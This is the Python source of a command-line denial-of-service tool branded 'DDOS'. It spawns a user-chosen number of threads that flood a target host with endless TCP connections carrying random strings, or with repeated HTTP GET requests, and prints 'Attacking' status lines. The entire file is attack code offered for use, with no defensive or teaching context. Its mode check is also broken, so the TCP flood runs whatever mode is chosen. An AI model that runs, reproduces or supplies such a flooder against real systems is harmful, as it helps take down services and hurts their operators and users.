#!/usr/bin/env python3
import socket
import requests
import argparse
import sys
import os
import random
import string
import threading

# -- Made by Theo Kershaw --

threads = []

class Colours():
	red = "\033[31m"
	blue = "\033[34m"
	green = "\033[32m"
	white = "\033[37m"

def Random_Gen(size=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

def Custom_Help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(f'''{Colours.red}
███████▄  ████████▄   ▄██████▄     ▄████████ 
███   ▀███ ███   ▀███ ███    ███   ███    ███ 
███    ███ ███    ███ ███    ███   ███    █▀  
███    ███ ███    ███ ███    ███   ███        
███    ███ ███    ███ ███    ███ ▀███████████ 
███    ███ ███    ███ ███    ███          ███ 
███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
████████▀  ████████▀   ▀██████▀   ▄████████▀  \n
{Colours.green}Auther:{Colours.blue} Theo Kershaw, {Colours.green}GitHub: {Colours.blue}@TKMASTERPYBAT
		''')
	print(f'''
{Colours.white}-h, --help	{Colours.blue}:	{Colours.red}Show This Menu
{Colours.white}-t, --target	{Colours.blue}: {Colours.red}	Specify Target
{Colours.white}-p, --port	{Colours.blue}:	{Colours.red}What Port To Target (Default: 80)
{Colours.white}-m, --mode	{Colours.blue}: {Colours.red}	What Type Of Attack (TCP, HTTP)
{Colours.white}-a, --amount 	{Colours.blue}:	{Colours.red}Amount Of Threads / Bytes (Default: 100)
		\n''')

def MainArg():
	if '-h' in sys.argv or '--help' in sys.argv:
	    Custom_Help()
	    sys.exit(0)

	parser = argparse.ArgumentParser(usage=f"{Colours.red}[{Colours.white}!{Colours.red}] {Colours.white}Type [-h] Or [--help] For Menu{Colours.red}...\n")
	parser.add_argument("-t", "--target", required=True)
	parser.add_argument("-p", "--port", default=80, type=int)
	parser.add_argument("-m", "--mode", required=True, type=str)
	parser.add_argument("-a", "--amount", default=100, type=int)
	parser.add_argument("-b", "--bytes", default=100, type=int)

	args = parser.parse_args()

	if args.mode == 'tcp' or 'TCP':
		DDoS_Main_TCP(args)
	if args.mode == 'http' or 'HTTP':
		DDoS_Main_HTTP(args)
	else:
		print(f'{Colours.red}[{Colours.white}-{Colours.red}] {Colours.white}Invalid Mode. Use (TCP, HTTP)\n')

def DDoS_Main_TCP(args):
	os.system('cls' if os.name == 'nt' else 'clear')
	print(f'''{Colours.red}
███████▄  ████████▄   ▄██████▄     ▄████████ 
███   ▀███ ███   ▀███ ███    ███   ███    ███ 
███    ███ ███    ███ ███    ███   ███    █▀  
███    ███ ███    ███ ███    ███   ███        
███    ███ ███    ███ ███    ███ ▀███████████ 
███    ███ ███    ███ ███    ███          ███ 
███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
████████▀  ████████▀   ▀██████▀   ▄████████▀  \n
{Colours.green}Auther:{Colours.blue} Theo Kershaw, {Colours.green}GitHub: {Colours.blue}@TKMASTERPYBAT
		\n''')

	def DDoS_Attack_TCP():
		while True:
			try:
				ip = socket.gethostbyname(args.target)
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip, args.port))
				msg = Random_Gen()
				s.send(msg.encode())
				s.close()
				print(f'{Colours.green}[{Colours.white}+{Colours.green}]{Colours.white} Attacking{Colours.blue}:{Colours.red} {args.target}{Colours.white} Port{Colours.blue}:{Colours.red} {args.port} {Colours.white}Amount{Colours.blue}:{Colours.red} {args.amount} {Colours.white}Mode{Colours.blue}:{Colours.red} {args.mode}  {Colours.white}Thread{Colours.blue}:{Colours.red} {threading.current_thread().name}{Colours.green}...')
			except ConnectionError:
				print(f'{Colours.red}[{Colours.white}-{Colours.red}]{Colours.white} Connection Error {Colours.red}...')
			except ConnectionRefusedError:
				print(f'{Colours.red}[{Colours.white}-{Colours.red}]{Colours.white} Connection Refused Error {Colours.red}...')

	for _ in range(args.amount):
		thread = threading.Thread(target=DDoS_Attack_TCP)
		threads.append(thread)
		thread.start()

	for thread in threads:
		thread.join()

def DDoS_Main_HTTP(args):
	os.system('cls' if os.name == 'nt' else 'clear')
	print(f'''{Colours.red}
███████▄  ████████▄   ▄██████▄     ▄████████ 
███   ▀███ ███   ▀███ ███    ███   ███    ███ 
███    ███ ███    ███ ███    ███   ███    █▀  
███    ███ ███    ███ ███    ███   ███        
███    ███ ███    ███ ███    ███ ▀███████████ 
███    ███ ███    ███ ███    ███          ███ 
███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
████████▀  ████████▀   ▀██████▀   ▄████████▀  \n
{Colours.green}Auther:{Colours.blue} Theo Kershaw, {Colours.green}GitHub: {Colours.blue}@TKMASTERPYBAT
		\n''')

	def DDoS_Attack_HTTP():
		while True:
			r = requests.get(args.target)
			print(f'{Colours.green}[{Colours.white}+{Colours.green}]{Colours.white} Attacking{Colours.blue}:{Colours.red} {args.target} {Colours.white}Amount{Colours.blue}:{Colours.red} {args.amount} {Colours.white}Mode{Colours.blue}:{Colours.red} {args.mode}  {Colours.white}Thread{Colours.blue}:{Colours.red} {threading.current_thread().name}{Colours.green}...')

	for _ in range(args.amount):
		thread = threading.Thread(target=DDoS_Attack_HTTP)
		threads.append(thread)
		thread.start()

	for thread in threads:
		thread.join()

if __name__ == "__main__":
	MainArg()




